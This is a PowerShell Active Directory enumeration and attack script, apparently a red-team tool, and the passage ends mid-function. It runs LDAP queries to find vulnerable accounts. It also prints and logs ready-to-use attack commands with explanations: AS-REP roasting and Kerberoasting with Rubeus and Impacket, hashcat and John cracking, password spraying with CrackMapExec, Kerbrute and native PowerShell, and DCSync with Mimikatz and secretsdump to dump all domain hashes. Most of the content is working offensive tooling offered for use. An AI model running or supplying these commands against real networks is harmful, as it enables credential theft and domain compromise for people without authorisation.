#mahdiesta Version

#Requires -Version 3.0

[CmdletBinding()]
param(
    [switch]$SkipToolCheck,
    [switch]$QuickScan,
    [switch]$ShowAllCommands,
    [string]$OutputDir = ".\ADEnum_$(Get-Date -Format 'yyyyMMdd_HHmmss')"
)

# ================================================
# ERROR HANDLING & LOGGING
# ================================================

$ErrorActionPreference = "SilentlyContinue"
$Global:EnumErrors = @()
$Global:ExecutedCommands = @()
$Global:AttackCommands = @()

function Write-Log {
    param(
        [string]$Message,
        [ValidateSet('Info','Success','Warning','Error','Command','Critical','Attack')]
        [string]$Level = 'Info'
    )
    
    $colors = @{
        'Info' = 'Cyan'
        'Success' = 'Green'
        'Warning' = 'Yellow'
        'Error' = 'Red'
        'Command' = 'Magenta'
        'Critical' = 'Red'
        'Attack' = 'Yellow'
    }
    
    $timestamp = Get-Date -Format "HH:mm:ss"
    Write-Host "[$timestamp]" -NoNewline -ForegroundColor Gray
    Write-Host " $Message" -ForegroundColor $colors[$Level]
}

function Log-Command {
    param(
        [string]$Command,
        [string]$Description,
        [string]$Category = "Enumeration"
    )
    
    $Global:ExecutedCommands += [PSCustomObject]@{
        Time = Get-Date -Format "HH:mm:ss"
        Category = $Category
        Description = $Description
        Command = $Command
    }
    
    Write-Log "  [CMD] $Command" -Level Command
}

function Add-AttackCommand {
    param(
        [string]$Command,
        [string]$Description,
        [string]$Category,
        [string]$Target = "",
        [string]$Tool = "",
        [string]$Platform = "Windows"
    )
    
    $Global:AttackCommands += [PSCustomObject]@{
        Category = $Category
        Target = $Target
        Tool = $Tool
        Platform = $Platform
        Command = $Command
        Description = $Description
    }
}

function Invoke-SafeCommand {
    param(
        [scriptblock]$ScriptBlock,
        [string]$ErrorMessage = "Command failed"
    )
    
    try {
        return & $ScriptBlock
    }
    catch {
        $Global:EnumErrors += [PSCustomObject]@{
            Time = Get-Date
            Error = $ErrorMessage
            Details = $_.Exception.Message
        }
        Write-Log "$ErrorMessage : $($_.Exception.Message)" -Level Error
        return $null
    }
}

# ================================================
# ENVIRONMENT DETECTION & VALIDATION
# ================================================

function Test-ADEnvironment {
    Write-Log "Detecting Active Directory environment..." -Level Info
    
    $adInfo = @{
        IsADJoined = $false
        Domain = $null
        DomainController = $null
        Forest = $null
        CurrentUser = [Security.Principal.WindowsIdentity]::GetCurrent().Name
        IsElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
        ComputerName = $env:COMPUTERNAME
        OSVersion = [Environment]::OSVersion.VersionString
    }
    
    # Try multiple methods to detect domain
    Log-Command "[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()" "Uses .NET DirectoryServices to retrieve current domain information including domain name, forest, and domain controllers" "Initial Enumeration"
    
    $methods = @(
        { [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() },
        { Get-WmiObject Win32_ComputerSystem | Select-Object -ExpandProperty Domain },
        { $env:USERDNSDOMAIN }
    )
    
    foreach ($method in $methods) {
        $result = Invoke-SafeCommand -ScriptBlock $method
        if ($result) {
            if ($result -is [System.DirectoryServices.ActiveDirectory.Domain]) {
                $adInfo.IsADJoined = $true
                $adInfo.Domain = $result.Name
                $adInfo.Forest = $result.Forest.Name
                $adInfo.DomainController = $result.PdcRoleOwner.Name
                break
            }
            elseif ($result -match '\.') {
                $adInfo.IsADJoined = $true
                $adInfo.Domain = $result
                break
            }
        }
    }
    
    # Try to find DC if not found
    if ($adInfo.IsADJoined -and -not $adInfo.DomainController) {
        $dc = Invoke-SafeCommand -ScriptBlock {
            (Get-WmiObject -Query "SELECT * FROM Win32_NTDomain WHERE DomainName='$($adInfo.Domain)'").DomainControllerName -replace '\\',''
        }
        if ($dc) { $adInfo.DomainController = $dc }
    }
    
    if (-not $adInfo.IsADJoined) {
        Write-Log "Not joined to Active Directory domain. Limited enumeration available." -Level Warning
    }
    else {
        Write-Log "Domain: $($adInfo.Domain) | DC: $($adInfo.DomainController)" -Level Success
    }
    
    return $adInfo
}

# ================================================
# TOOL DETECTION
# ================================================

function Get-AvailableTools {
    if ($SkipToolCheck) {
        return @('Native')
    }
    
    Write-Log "Checking available tools..." -Level Info
    
    $tools = @{
        'Rubeus' = @{ Path = '.\Rubeus.exe'; Test = { Test-Path '.\Rubeus.exe' } }
        'PowerView' = @{ Path = '.\PowerView.ps1'; Test = { Test-Path '.\PowerView.ps1' } }
        'SharpHound' = @{ Path = '.\SharpHound.exe'; Test = { Test-Path '.\SharpHound.exe' } }
        'Mimikatz' = @{ Path = '.\mimikatz.exe'; Test = { Test-Path '.\mimikatz.exe' } }
        'ADModule' = @{ Test = { Get-Module -ListAvailable ActiveDirectory } }
        'Native' = @{ Test = { $true } }
    }
    
    $available = @()
    foreach ($tool in $tools.GetEnumerator()) {
        if (Invoke-SafeCommand -ScriptBlock $tool.Value.Test) {
            $available += $tool.Key
            Write-Log "  [+] $($tool.Key) available" -Level Success
        }
    }
    
    return $available
}

# ================================================
# LDAP QUERY FUNCTIONS
# ================================================

function Get-LDAPSearcher {
    param([string]$Filter, [string[]]$Properties)
    
    try {
        $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
        $searcher = New-Object System.DirectoryServices.DirectorySearcher
        $searcher.SearchRoot = [ADSI]"LDAP://$($domain.Name)"
        $searcher.Filter = $Filter
        $searcher.PageSize = 1000
        
        if ($Properties) {
            $Properties | ForEach-Object { [void]$searcher.PropertiesToLoad.Add($_) }
        }
        
        return $searcher
    }
    catch {
        return $null
    }
}

function Invoke-LDAPQuery {
    param(
        [string]$Filter,
        [string[]]$Properties = @('*')
    )
    
    $searcher = Get-LDAPSearcher -Filter $Filter -Properties $Properties
    if (-not $searcher) { return @() }
    
    try {
        $results = $searcher.FindAll()
        $output = @()
        
        foreach ($result in $results) {
            $obj = @{}
            foreach ($prop in $result.Properties.Keys) {
                $value = $result.Properties[$prop]
                if ($value.Count -eq 1) {
                    $obj[$prop] = $value[0]
                }
                else {
                    $obj[$prop] = @($value)
                }
            }
            $output += [PSCustomObject]$obj
        }
        
        $results.Dispose()
        $searcher.Dispose()
        
        return $output
    }
    catch {
        if ($searcher) { $searcher.Dispose() }
        return @()
    }
}

# ================================================
# ATTACK COMMAND GENERATION FUNCTIONS
# ================================================

function Show-ASREPAttackCommands {
    param(
        [string]$Username,
        [string]$Domain,
        [string]$DomainController
    )
    
    Write-Host "`n      === ASREP ROASTING ATTACK COMMANDS ===" -ForegroundColor Yellow
    
    # Windows - Rubeus
    $cmd = ".\Rubeus.exe asreproast /user:$Username /format:hashcat /nowrap /outfile:asrep_$Username.hash"
    Write-Host "      [Windows/Rubeus]" -ForegroundColor Cyan
    Write-Host "      $cmd" -ForegroundColor White
    Write-Host "      Description: Uses Rubeus to perform AS-REP Roasting attack, extracts the AS-REP hash" -ForegroundColor Gray
    Write-Host "                   for the user account and formats output for Hashcat. The /nowrap option" -ForegroundColor Gray
    Write-Host "                   ensures the hash is on a single line for easier cracking." -ForegroundColor Gray
    Add-AttackCommand -Command $cmd -Description "Rubeus AS-REP Roasting - Extracts hash for offline cracking" -Category "AS-REP Roasting" -Target $Username -Tool "Rubeus" -Platform "Windows"
    
    # Windows - PowerView
    $cmd = "Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname | fl"
    Write-Host "`n      [Windows/PowerView]" -ForegroundColor Cyan
    Write-Host "      $cmd" -ForegroundColor White
    Write-Host "      Description: PowerView command to enumerate all accounts with Kerberos pre-authentication" -ForegroundColor Gray
    Write-Host "                   disabled (DONT_REQ_PREAUTH flag). Lists SAM account names and UPNs." -ForegroundColor Gray
    Add-AttackCommand -Command $cmd -Description "PowerView AS-REP enumeration - Lists vulnerable accounts" -Category "AS-REP Roasting" -Target $Username -Tool "PowerView" -Platform "Windows"
    
    # Linux - Impacket GetNPUsers
    $cmd = "GetNPUsers.py $Domain/$Username -no-pass -dc-ip $DomainController"
    Write-Host "`n      [Linux/Impacket]" -ForegroundColor Cyan
    Write-Host "      $cmd" -ForegroundColor White
    Write-Host "      Description: Impacket's GetNPUsers.py queries the KDC for users with pre-authentication" -ForegroundColor Gray
    Write-Host "                   disabled and retrieves their AS-REP hash without needing a password." -ForegroundColor Gray
    Add-AttackCommand -Command $cmd -Description "Impacket AS-REP Roasting - Retrieves hash without authentication" -Category "AS-REP Roasting" -Target $Username -Tool "GetNPUsers.py" -Platform "Linux"
    
    # Linux - Impacket with output file
    $cmd = "impacket-GetNPUsers $Domain/$Username -no-pass -dc-ip $DomainController -format hashcat -outputfile asrep_$Username.hash"
    Write-Host "`n      [Linux/Impacket - Full]" -ForegroundColor Cyan
    Write-Host "      $cmd" -ForegroundColor White
    Write-Host "      Description: Complete Impacket command that retrieves the AS-REP hash and automatically" -ForegroundColor Gray
    Write-Host "                   formats it for Hashcat, saving to a file for offline cracking." -ForegroundColor Gray
    Add-AttackCommand -Command $cmd -Description "Impacket AS-REP with Hashcat format output" -Category "AS-REP Roasting" -Target $Username -Tool "GetNPUsers.py" -Platform "Linux"
    
    # Kerbrute - Username enumeration with AS-REP
    $cmd = "kerbrute userenum -d $Domain --dc $DomainController /opt/jsmith.txt"
    Write-Host "`n      [Linux/Kerbrute]" -ForegroundColor Cyan
    Write-Host "      $cmd" -ForegroundColor White
    Write-Host "      Description: Kerbrute performs username enumeration and automatically retrieves AS-REP" -ForegroundColor Gray
    Write-Host "                   hashes for accounts without pre-authentication. Very fast and stealthy." -ForegroundColor Gray
    Add-AttackCommand -Command $cmd -Description "Kerbrute username enum with automatic AS-REP extraction" -Category "AS-REP Roasting" -Target $Username -Tool "Kerbrute" -Platform "Linux"
    
    # Hash Cracking
    $cmd = "hashcat -m 18200 asrep_$Username.hash /usr/share/wordlists/rockyou.txt -O"
    Write-Host "`n      [Cracking/Hashcat]" -ForegroundColor Magenta
    Write-Host "      $cmd" -ForegroundColor White
    Write-Host "      Description: Hashcat mode 18200 is for Kerberos 5 AS-REP etype 23 (RC4-HMAC)." -ForegroundColor Gray
    Write-Host "                   The -O flag enables optimized kernels for faster cracking." -ForegroundColor Gray
    Add-AttackCommand -Command $cmd -Description "Crack AS-REP hash using Hashcat with rockyou wordlist" -Category "Password Cracking" -Target $Username -Tool "Hashcat" -Platform "Linux"
    
    # Alternative cracking with rules
    $cmd = "hashcat -m 18200 asrep_$Username.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule"
    Write-Host "`n      [Cracking/Hashcat+Rules]" -ForegroundColor Magenta
    Write-Host "      $cmd" -ForegroundColor White
    Write-Host "      Description: Uses hashcat with mutation rules (best64.rule) to try variations of" -ForegroundColor Gray
    Write-Host "                   wordlist entries. Significantly increases crack success rate." -ForegroundColor Gray
    Add-AttackCommand -Command $cmd -Description "Crack with hashcat using rule-based mutations" -Category "Password Cracking" -Target $Username -Tool "Hashcat" -Platform "Linux"
}

function Show-KerberoastAttackCommands {
    param(
        [string]$Username,
        [string]$Domain,
        [string]$DomainController,
        [string]$SPNs
    )
    
    Write-Host "`n      === KERBEROASTING ATTACK COMMANDS ===" -ForegroundColor Yellow
    
    # Windows - Rubeus
    $cmd = ".\Rubeus.exe kerberoast /user:$Username /simple /nowrap /outfile:tgs_$Username.txt"
    Write-Host "      [Windows/Rubeus]" -ForegroundColor Cyan
    Write-Host "      $cmd" -ForegroundColor White
    Write-Host "      Description: Rubeus requests a TGS (Ticket Granting Service) ticket for the specified" -ForegroundColor Gray
    Write-Host "                   user's SPN. The /simple flag outputs in Hashcat format, /nowrap prevents" -ForegroundColor Gray
    Write-Host "                   line wrapping for easier processing." -ForegroundColor Gray
    Add-AttackCommand -Command $cmd -Description "Rubeus Kerberoasting - Request TGS ticket for SPN account" -Category "Kerberoasting" -Target $Username -Tool "Rubeus" -Platform "Windows"
    
    # Windows - Rubeus with admin filter
    $cmd = ".\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap"
    Write-Host "`n      [Windows/Rubeus - Admin Accounts]" -ForegroundColor Cyan
    Write-Host "      $cmd" -ForegroundColor White
    Write-Host "      Description: Targets only privileged accounts (admincount=1) which are high-value" -ForegroundColor Gray
    Write-Host "                   targets. These accounts typically have elevated permissions if cracked." -ForegroundColor Gray
    Add-AttackCommand -Command $cmd -Description "Kerberoast only admin accounts using LDAP filter" -Category "Kerberoasting" -Target "Admin Accounts" -Tool "Rubeus" -Platform "Windows"
    
    # Windows - Rubeus stats
    $cmd = ".\Rubeus.exe kerberoast /stats"
    Write-Host "`n      [Windows/Rubeus - Statistics]" -ForegroundColor Cyan
    Write-Host "      $cmd" -ForegroundColor White
    Write-Host "      Description: Displays statistics about Kerberoastable accounts including encryption" -ForegroundColor Gray
    Write-Host "                   types (RC4 vs AES). RC4 hashes are easier to crack than AES." -ForegroundColor Gray
    Add-AttackCommand -Command $cmd -Description "Check Kerberoasting statistics and encryption types" -Category "Kerberoasting" -Target "Domain" -Tool "Rubeus" -Platform "Windows"
    
    # Windows - PowerView
    $cmd = "Get-DomainUser -SPN | select samaccountname,serviceprincipalname,memberof | fl"
    Write-Host "`n      [Windows/PowerView]" -ForegroundColor Cyan
    Write-Host "      $cmd" -ForegroundColor White
    Write-Host "      Description: PowerView enumerates all user accounts with SPNs registered. Shows account" -ForegroundColor Gray
    Write-Host "                   names, their SPNs, and group memberships to identify high-value targets." -ForegroundColor Gray
    Add-AttackCommand -Command $cmd -Description "Enumerate all Kerberoastable accounts with PowerView" -Category "Kerberoasting" -Target $Username -Tool "PowerView" -Platform "Windows"
    
    # Windows - PowerView Kerberoast
    $cmd = "Get-DomainUser -Identity $Username | Get-DomainSPNTicket -Format Hashcat"
    Write-Host "`n      [Windows/PowerView - Request Ticket]" -ForegroundColor Cyan
    Write-Host "      $cmd" -ForegroundColor White
    Write-Host "      Description: PowerView requests the TGS ticket for a specific user and automatically" -ForegroundColor Gray
    Write-Host "                   formats the output for Hashcat cracking." -ForegroundColor Gray
    Add-AttackCommand -Command $cmd -Description "Request and format TGS ticket using PowerView" -Category "Kerberoasting" -Target $Username -Tool "PowerView" -Platform "Windows"
    
    # Windows - PowerView Export All
    $cmd = "Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast_hashes.csv -NoTypeInformation"
    Write-Host "`n      [Windows/PowerView - Export All]" -ForegroundColor Cyan
    Write-Host "      $cmd" -ForegroundColor White
    Write-Host "      Description: Requests TGS tickets for ALL Kerberoastable accounts in the domain and" -ForegroundColor Gray
    Write-Host "                   exports them to CSV for bulk offline cracking." -ForegroundColor Gray
    Add-AttackCommand -Command $cmd -Description "Export all Kerberoastable hashes to CSV" -Category "Kerberoasting" -Target "All SPNs" -Tool "PowerView" -Platform "Windows"
    
    # Linux - Impacket GetUserSPNs
    $cmd = "GetUserSPNs.py $Domain/USER:PASSWORD -dc-ip $DomainController -request-user $Username"
    Write-Host "`n      [Linux/Impacket]" -ForegroundColor Cyan
    Write-Host "      $cmd" -ForegroundColor White
    Write-Host "      Description: Impacket's GetUserSPNs.py authenticates to the domain and requests the" -ForegroundColor Gray
    Write-Host "                   TGS ticket for the specified user account. Requires valid credentials." -ForegroundColor Gray
    Add-AttackCommand -Command $cmd -Description "Request TGS ticket using Impacket (requires auth)" -Category "Kerberoasting" -Target $Username -Tool "GetUserSPNs.py" -Platform "Linux"
    
    # Linux - Impacket with output
    $cmd = "GetUserSPNs.py $Domain/USER:PASSWORD -dc-ip $DomainController -request-user $Username -outputfile tgs_$Username.txt"
    Write-Host "`n      [Linux/Impacket - Full]" -ForegroundColor Cyan
    Write-Host "      $cmd" -ForegroundColor White
    Write-Host "      Description: Complete Impacket command that authenticates, requests TGS ticket, and" -ForegroundColor Gray
    Write-Host "                   saves the hash to a file for offline cracking." -ForegroundColor Gray
    Add-AttackCommand -Command $cmd -Description "Request and save TGS ticket to file" -Category "Kerberoasting" -Target $Username -Tool "GetUserSPNs.py" -Platform "Linux"
    
    # Linux - Impacket enumerate all
    $cmd = "GetUserSPNs.py $Domain/USER:PASSWORD -dc-ip $DomainController -request"
    Write-Host "`n      [Linux/Impacket - All SPNs]" -ForegroundColor Cyan
    Write-Host "      $cmd" -ForegroundColor White
    Write-Host "      Description: Requests TGS tickets for ALL accounts with SPNs in the domain. The -request" -ForegroundColor Gray
    Write-Host "                   flag automatically downloads tickets for all discovered SPN accounts." -ForegroundColor Gray
    Add-AttackCommand -Command $cmd -Description "Request all TGS tickets in the domain" -Category "Kerberoasting" -Target "All SPNs" -Tool "GetUserSPNs.py" -Platform "Linux"
    
    # Native Windows - SPN enumeration
    $cmd = "setspn.exe -Q */*"
    Write-Host "`n      [Windows/Native]" -ForegroundColor Cyan
    Write-Host "      $cmd" -ForegroundColor White
    Write-Host "      Description: Built-in Windows command to enumerate all SPNs registered in the domain." -ForegroundColor Gray
    Write-Host "                   No additional tools required. Useful for initial reconnaissance." -ForegroundColor Gray
    Add-AttackCommand -Command $cmd -Description "Native Windows SPN enumeration" -Category "Kerberoasting" -Target "Domain" -Tool "setspn.exe" -Platform "Windows"
    
    # Native Windows - Targeted SPN query
    $cmd = "setspn.exe -T $Domain -Q */* | Select-String '^CN' -Context 0,1"
    Write-Host "`n      [Windows/Native - Filtered]" -ForegroundColor Cyan
    Write-Host "      $cmd" -ForegroundColor White
    Write-Host "      Description: Enhanced SPN query that filters output to show only CN (Common Name)" -ForegroundColor Gray
    Write-Host "                   entries with context. Makes output more readable for analysis." -ForegroundColor Gray
    Add-AttackCommand -Command $cmd -Description "Native Windows SPN enumeration with filtering" -Category "Kerberoasting" -Target "Domain" -Tool "setspn.exe" -Platform "Windows"
    
    # Hash Cracking
    $cmd = "hashcat -m 13100 tgs_$Username.txt /usr/share/wordlists/rockyou.txt -O"
    Write-Host "`n      [Cracking/Hashcat]" -ForegroundColor Magenta
    Write-Host "      $cmd" -ForegroundColor White
    Write-Host "      Description: Hashcat mode 13100 is for Kerberos 5 TGS-REP etype 23 (RC4-HMAC)." -ForegroundColor Gray
    Write-Host "                   This cracks the service account password from the TGS ticket." -ForegroundColor Gray
    Add-AttackCommand -Command $cmd -Description "Crack TGS hash with Hashcat" -Category "Password Cracking" -Target $Username -Tool "Hashcat" -Platform "Linux"
    
    # John the Ripper alternative
    $cmd = "john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt tgs_$Username.txt"
    Write-Host "`n      [Cracking/John]" -ForegroundColor Magenta
    Write-Host "      $cmd" -ForegroundColor White
    Write-Host "      Description: John the Ripper alternative for cracking Kerberos TGS tickets. Sometimes" -ForegroundColor Gray
    Write-Host "                   faster for specific hash types. Use if Hashcat is unavailable." -ForegroundColor Gray
    Add-AttackCommand -Command $cmd -Description "Alternative cracking with John the Ripper" -Category "Password Cracking" -Target $Username -Tool "John" -Platform "Linux"
}

function Show-PasswordSprayCommands {
    param(
        [string]$Domain,
        [string]$DomainController,
        [int]$LockoutThreshold
    )
    
    Write-Host "`n      === PASSWORD SPRAYING ATTACK COMMANDS ===" -ForegroundColor Yellow
    
    # Calculate safe attempt count
    $safeAttempts = if ($LockoutThreshold -eq 0) { "unlimited" } else { $LockoutThreshold - 1 }
    
    Write-Host "      [!] Account Lockout Threshold: $LockoutThreshold attempts" -ForegroundColor $(if ($LockoutThreshold -eq 0) { "Red" } else { "Yellow" })
    Write-Host "      [!] Safe Spray Attempts: $safeAttempts" -ForegroundColor Yellow
    Write-Host ""
    
    # CrackMapExec - Single password
    $cmd = "crackmapexec smb $DomainController -u users.txt -p 'Winter2024!' --continue-on-success"
    Write-Host "      [Linux/CrackMapExec]" -ForegroundColor Cyan
    Write-Host "      $cmd" -ForegroundColor White
    Write-Host "      Description: CrackMapExec performs password spraying against SMB. The --continue-on-success" -ForegroundColor Gray
    Write-Host "                   flag ensures all users are tested even after finding valid credentials." -ForegroundColor Gray
    Write-Host "                   Tests one password against multiple users to avoid lockouts." -ForegroundColor Gray
    Add-AttackCommand -Command $cmd -Description "Password spray with CrackMapExec via SMB" -Category "Password Spraying" -Target $Domain -Tool "CrackMapExec" -Platform "Linux"
    
    # CrackMapExec - Filter successes
    $cmd = "crackmapexec smb $DomainController -u users.txt -p 'Winter2024!' | grep '+'"
    Write-Host "`n      [Linux/CrackMapExec - Filtered]" -ForegroundColor Cyan
    Write-Host "      $cmd" -ForegroundColor White
    Write-Host "      Description: Same as above but filters output to show only successful authentications." -ForegroundColor Gray
    Write-Host "                   The grep '+' looks for the [+] success indicator in CME output." -ForegroundColor Gray
    Add-AttackCommand -Command $cmd -Description "Password spray with filtered output showing only successes" -Category "Password Spraying" -Target $Domain -Tool "CrackMapExec" -Platform "Linux"
    
    # CrackMapExec - Local auth
    $cmd = "crackmapexec smb --local-auth $DomainController -u administrator -p 'Winter2024!'"
    Write-Host "`n      [Linux/CrackMapExec - Local Admin]" -ForegroundColor Cyan
    Write-Host "      $cmd" -ForegroundColor White
    Write-Host "      Description: Tests local administrator credentials using --local-auth flag. Useful for" -ForegroundColor Gray
    Write-Host "                   testing default/common local admin passwords across multiple systems." -ForegroundColor Gray
    Add-AttackCommand -Command $cmd -Description "Test local administrator account with common password" -Category "Password Spraying" -Target "Local Admin" -Tool "CrackMapExec" -Platform "Linux"
    
    # Kerbrute password spray
    $cmd = "kerbrute passwordspray -d $Domain --dc $DomainController users.txt 'Winter2024!'"
    Write-Host "`n      [Linux/Kerbrute]" -ForegroundColor Cyan
    Write-Host "      $cmd" -ForegroundColor White
    Write-Host "      Description: Kerbrute performs password spraying via Kerberos pre-authentication. Much" -ForegroundColor Gray
    Write-Host "                   stealthier than SMB as it generates less logs and doesn't trigger lockouts" -ForegroundColor Gray
    Write-Host "                   as readily. Extremely fast for large user lists." -ForegroundColor Gray
    Add-AttackCommand -Command $cmd -Description "Stealthy password spray using Kerberos" -Category "Password Spraying" -Target $Domain -Tool "Kerbrute" -Platform "Linux"
    
    # rpcclient password spray
    $cmd = 'for u in $(cat users.txt); do rpcclient -U "$u%Winter2024!" -c "getusername;quit" ' + $DomainController + ' | grep Authority; done'
    Write-Host "`n      [Linux/rpcclient - Bash Loop]" -ForegroundColor Cyan
    Write-Host "      $cmd" -ForegroundColor White
    Write-Host "      Description: Bash one-liner that loops through users and tests password via RPC. Filters" -ForegroundColor Gray
    Write-Host "                   output to show only successful authentications (grep Authority). Low-tech" -ForegroundColor Gray
    Write-Host "                   but effective when other tools aren't available." -ForegroundColor Gray
    Add-AttackCommand -Command $cmd -Description "Password spray using rpcclient in bash loop" -Category "Password Spraying" -Target $Domain -Tool "rpcclient" -Platform "Linux"
    
    # PowerShell - DomainPasswordSpray
    $cmd = "Import-Module .\DomainPasswordSpray.ps1; Invoke-DomainPasswordSpray -Password 'Winter2024!' -OutFile spray_success.txt -ErrorAction SilentlyContinue"
    Write-Host "`n      [Windows/DomainPasswordSpray]" -ForegroundColor Cyan
    Write-Host "      $cmd" -ForegroundColor White
    Write-Host "      Description: PowerShell-based password spraying tool that intelligently handles lockout" -ForegroundColor Gray
    Write-Host "                   thresholds. Automatically generates user list from AD and respects lockout" -ForegroundColor Gray
    Write-Host "                   policies. Outputs results to file." -ForegroundColor Gray
    Add-AttackCommand -Command $cmd -Description "Intelligent password spray from Windows with lockout awareness" -Category "Password Spraying" -Target $Domain -Tool "DomainPasswordSpray" -Platform "Windows"
    
    # PowerShell - Custom spray script
    $cmd = '$users = Get-Content users.txt; $pw = "Winter2024!"; $users | % { $u = $_; $result = (New-Object System.DirectoryServices.DirectoryEntry("",$u,$pw)).psbase.name; if ($result) { Write-Host "[+] Valid: $u" } }'
    Write-Host "`n      [Windows/PowerShell - Native]" -ForegroundColor Cyan
    Write-Host "      $cmd" -ForegroundColor White
    Write-Host "      Description: Native PowerShell password spray using DirectoryEntry class. No external" -ForegroundColor Gray
    Write-Host "                   tools required. Tests LDAP authentication for each user." -ForegroundColor Gray
    Add-AttackCommand -Command $cmd -Description "Native PowerShell password spray without external tools" -Category "Password Spraying" -Target $Domain -Tool "PowerShell" -Platform "Windows"
}

function Show-DCSystemCommands {
    param(
        [string]$Domain,
        [string]$DomainController,
        [string]$Username = "USER",
        [string]$Password = "PASSWORD"
    )
    
    Write-Host "`n      === DCSYNC ATTACK COMMANDS ===" -ForegroundColor Yellow
    
    # Mimikatz DCSync
    $cmd = "mimikatz # lsadump::dcsync /domain:$Domain /user:$Domain\administrator"
    Write-Host "      [Windows/Mimikatz]" -ForegroundColor Cyan
    Write-Host "      $cmd" -ForegroundColor White
    Write-Host "      Description: Mimikatz DCSync impersonates a Domain Controller to request password data" -ForegroundColor Gray
    Write-Host "                   from another DC. Requires Replicating Directory Changes permissions." -ForegroundColor Gray
    Write-Host "                   Retrieves NTLM hash without needing direct access to NTDS.dit." -ForegroundColor Gray
    Add-AttackCommand -Command $cmd -Description "DCSync attack using Mimikatz to retrieve admin hash" -Category "DCSync" -Target "Administrator" -Tool "Mimikatz" -Platform "Windows"
    
    # Mimikatz DCSync all
    $cmd = "mimikatz # lsadump::dcsync /domain:$Domain /all"
    Write-Host "`n      [Windows/Mimikatz - All Users]" -ForegroundColor Cyan
    Write-Host "      $cmd" -ForegroundColor White
    Write-Host "      Description: DCSync attack targeting ALL domain users. Dumps entire password database." -ForegroundColor Gray
    Write-Host "                   Generates massive output - redirect to file. Very noisy operation." -ForegroundColor Gray
    Add-AttackCommand -Command $cmd -Description "DCSync all domain user hashes" -Category "DCSync" -Target "All Users" -Tool "Mimikatz" -Platform "Windows"
    
    # Impacket secretsdump - FIXED: Use string concatenation to avoid variable parsing issues
    $cmd = "secretsdump.py " + $Domain + "/" + $Username + ":" + $Password + "@" + $DomainController + " -just-dc-user " + $Domain + "/administrator"
    Write-Host "`n      [Linux/Impacket - Single User]" -ForegroundColor Cyan
    Write-Host "      $cmd" -ForegroundColor White
    Write-Host "      Description: Impacket's secretsdump performs DCSync remotely. The -just-dc-user option" -ForegroundColor Gray
    Write-Host "                   limits extraction to a specific user. Requires valid domain credentials" -ForegroundColor Gray
    Write-Host "                   with replication rights (typically Domain Admin equivalent)." -ForegroundColor Gray
    Add-AttackCommand -Command $cmd -Description "Remote DCSync for specific user using Impacket" -Category "DCSync" -Target "Administrator" -Tool "secretsdump.py" -Platform "Linux"
    
    # Impacket secretsdump - all hashes - FIXED
    $cmd = "secretsdump.py " + $Domain + "/" + $Username + ":" + $Password + "@" + $DomainController + " -just-dc -outputfile domain_hashes"
    Write-Host "`n      [Linux/Impacket - All Hashes]" -ForegroundColor Cyan
    Write-Host "      $cmd" -ForegroundColor White
    Write-Host "      Description: Extracts ALL NTLM hashes from NTDS.dit via DCSync. The -outputfile option" -ForegroundColor Gray
    Write-Host "                   saves results in multiple formats (.ntds, .sam, .secrets). Use -use-vss" -ForegroundColor Gray
    Write-Host "                   flag if DCSync fails - will attempt VSS copy method instead." -ForegroundColor Gray
    Add-AttackCommand -Command $cmd -Description "Extract all domain hashes to file via DCSync" -Category "DCSync" -Target "Domain" -Tool "secretsdump.py" -Platform "Linux"
    
    # Impacket with VSS - FIXED
    $cmd = "secretsdump.py " + $Domain + "/" + $Username + ":" + $Password + "@" + $DomainController + " -use-vss -just-dc-ntlm -outputfile ntds_dump"
    Write-Host "`n      [Linux/Impacket - VSS Method]" -ForegroundColor Cyan
    Write-Host "      $cmd" -ForegroundColor White
    Write-Host "      Description: Alternative extraction using Volume Shadow Copy Service. More reliable when" -ForegroundColor Gray
    Write-Host "                   DCSync fails. The -just-dc-ntlm limits output to NTLM hashes only (no" -ForegroundColor Gray
    Write-Host "                   Kerberos keys), making the dump faster and output smaller." -ForegroundColor Gray
    Add-AttackCommand -Command $cmd -Description "Hash extraction using VSS as fallback method" -Category "DCSync" -Target "Domain" -Tool "secretsdump.py" -Platform "Linux"
}

# ================================================
# ENUMERATION FUNCTIONS WITH INTEGRATED COMMANDS
# ================================================

function Get-ASREPRoastableAccounts {
    param([string]$Domain, [string]$DomainController)
    
    Write-Log "  [*] Enumerating AS-REP Roastable accounts..." -Level Info
    
    $filter = "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!userAccountControl:1.2.840.113556.1.4.803:=2))"
    Log-Command "LDAP Filter: $filter" "LDAP query using bitwise AND filter to find accounts with DONT_REQ_PREAUTH flag (0x400000). This identifies users vulnerable to AS-REP Roasting where Kerberos pre-authentication is disabled, allowing offline password cracking." "AS-REP Roasting"
    Log-Command "Get-DomainUser -PreauthNotRequired | Select-Object samaccountname,memberof,description" "PowerView command to enumerate user accounts with Kerberos pre-authentication disabled. Returns account names, group memberships, and descriptions for analysis." "AS-REP Roasting"
    
    $properties = @('samaccountname','userprincipalname','pwdlastset','lastlogon','memberof','description','admincount')
    
    $results = Invoke-LDAPQuery -Filter $filter -Properties $properties
    
    $accounts = @()
    foreach ($user in $results) {
        $accounts += [PSCustomObject]@{
            Account = $user.samaccountname
            UPN = $user.userprincipalname
            PwdLastSet = if ($user.pwdlastset) { [DateTime]::FromFileTime($user.pwdlastset) } else { $null }
            LastLogon = if ($user.lastlogon) { [DateTime]::FromFileTime($user.lastlogon) } else { $null }
            Description = $user.description
            IsAdmin = $user.admincount -eq 1
            Groups = if ($user.memberof) { ($user.memberof | ForEach-Object { ($_ -split ',')[0] -replace 'CN=' }) -join '; ' } else { '' }
        }
    }
    
    Write-Log "    Found: $($accounts.Count)" -Level Success
    
    if ($accounts.Count -gt 0) {
        Write-Host "`n  === AS-REP ROASTABLE ACCOUNTS ===" -ForegroundColor Yellow
        foreach ($account in $accounts) {
            Write-Host "  [*] Account: " -NoNewline -ForegroundColor Cyan
            Write-Host $account.Account -ForegroundColor White
            
